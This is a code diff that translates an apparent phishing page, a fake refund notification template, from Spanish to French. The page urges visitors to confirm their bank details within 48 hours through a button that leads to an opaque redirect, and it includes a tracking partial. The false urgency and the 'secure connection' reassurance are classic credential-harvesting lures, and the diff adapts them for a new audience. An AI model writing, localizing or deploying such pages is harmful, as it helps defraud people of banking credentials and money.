@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notificación de reembolso</title>
+    <title>Notification de remboursement</title>
     <link rel="stylesheet" href="./css/bratoka.css">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
     <%- include('partials/tracker') %>
@@ -144,41 +144,41 @@
         <div class="content-wrapper">
             <div class="notification-panel">
                 <div class="icon">✓</div>
-                <h2>Su reembolso de</h2>
-                <span class="amount">€<%= refundAmount %></span>
-                <p class="message">¡ya está listo para usted!</p>
+                <h2>Votre remboursement de</h2>
+                <span class="amount"><%= refundAmount %> €</span>
+                <p class="message">est disponible !</p>
                 
-                <p class="message">Para recibir su dinero, confirme su cuenta bancaria. <span class="deadline-text">¡Válido solo durante 48 horas!</span></p>
+                <p class="message">Pour recevoir vos fonds, veuillez confirmer vos coordonnées bancaires. <span class="deadline-text">Valable pendant 48 heures seulement !</span></p>
     
-                <a href="#" class="details-toggle" onclick="toggleDetails(); return false;">Más información sobre el reembolso ↓</a>
+                <a href="#" class="details-toggle" onclick="toggleDetails(); return false;">Plus d'informations sur le remboursement ↓</a>
                 
                 <div class="transaction-details-content" id="transactionDetails">
-                    <p class="details-title">DETALLES DEL REEMBOLSO</p>
+                    <p class="details-title">DÉTAILS DU REMBOURSEMENT</p>
                     <table>
                         <tr>
-                            <td class="label">Número de pedido:</td>
+                            <td class="label">Numéro de commande :</td>
                             <td class="value"><%= orderNumber %></td>
                         </tr>
                         <tr>
-                            <td class="label">Importe del reembolso:</td>
-                            <td class="value">€<%= refundAmount %></td>
+                            <td class="label">Montant du remboursement :</td>
+                            <td class="value"><%= refundAmount %> €</td>
                         </tr>
                         <tr>
-                            <td class="label">Procesado el:</td>
+                            <td class="label">Date de traitement :</td>
                             <td class="value"><%= processingDate %></td>
                         </tr>
                         <tr>
-                            <td class="label">Plazo de pago:</td>
+                            <td class="label">Délai de versement :</td>
                             <td class="value"><%= paymentDeadline %></td>
                         </tr>
                     </table>
                 </div>
     
-                <a href="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM" class="action-button btn">Recibir dinero ahora</a>
+                <a href="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM" class="action-button btn">Recevoir le remboursement maintenant</a>
                 
                 <p class="fine-print">
-                    Utilizamos una conexión segura para proteger sus datos. 
-                    Si no esperaba este reembolso, puede ignorar este mensaje.
+                    Nous utilisons une connexion sécurisée pour protéger vos données. 
+                    Si vous n'attendiez pas ce remboursement, vous pouvez ignorer ce message.
                 </p>
             </div>
         </div>
@@ -196,10 +196,10 @@
             var toggleLink = document.querySelector('.details-toggle');
             if (details.style.display === 'none' || details.style.display === '') {
                 details.style.display = 'block';
-                toggleLink.textContent = 'Ocultar detalles ↑';
+                toggleLink.textContent = 'Masquer les détails ↑';
             } else {
                 details.style.display = 'none';
-                toggleLink.textContent = 'Más información sobre el reembolso ↓';
+                toggleLink.textContent = 'Plus d\'informations sur le remboursement ↓';
             }
         }
 
